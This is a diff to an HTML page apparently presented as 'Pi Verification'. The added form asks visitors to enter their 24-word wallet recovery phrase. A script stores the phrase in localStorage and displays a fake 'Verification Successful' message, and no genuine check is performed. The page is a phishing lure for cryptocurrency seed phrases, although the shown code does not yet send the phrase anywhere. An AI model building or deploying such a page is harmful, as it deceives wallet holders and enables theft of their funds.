@@ -3,17 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pi Verify - Home</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Phrase Key Verification</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
+        input { width: 80%; padding: 10px; margin: 10px 0; }
+        button { padding: 10px 20px; background: blue; color: white; border: none; cursor: pointer; }
+        #box { max-width: 400px; margin: auto; padding: 20px; border: 2px solid #ccc; }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <img src="pi-icon.png" alt="Pi Verify Logo" class="logo">
-        <h1>Pi Verification API</h1>
-        <p>Click below to verify your phrase key securely.</p>
-        <a href="verify.html">
-            <button>Proceed to Verification</button>
-        </a>
+
+    <h2>Pi Verification</h2>
+    <div id="box">
+        <input type="text" id="phraseKey" placeholder="Enter your 24-word phrase key">
+        <button onclick="saveKey()">Verify</button>
     </div>
+    <p id="status"></p>
+
+    <script>
+        function saveKey() {
+            let key = document.getElementById("phraseKey").value;
+
+            // Check if the phrase key has 24 words
+            if (key.split(" ").length === 24) {
+                localStorage.setItem("savedPhraseKey", key); // Save to local storage
+                document.getElementById("box").style.display = "none"; // Hide input box
+                document.getElementById("status").innerText = "✅ Verification Successful!";
+            } else {
+                document.getElementById("status").innerText = "❌ Invalid Phrase Key! It must have 24 words.";
+            }
+        }
+    </script>
+
 </body>
 </html>
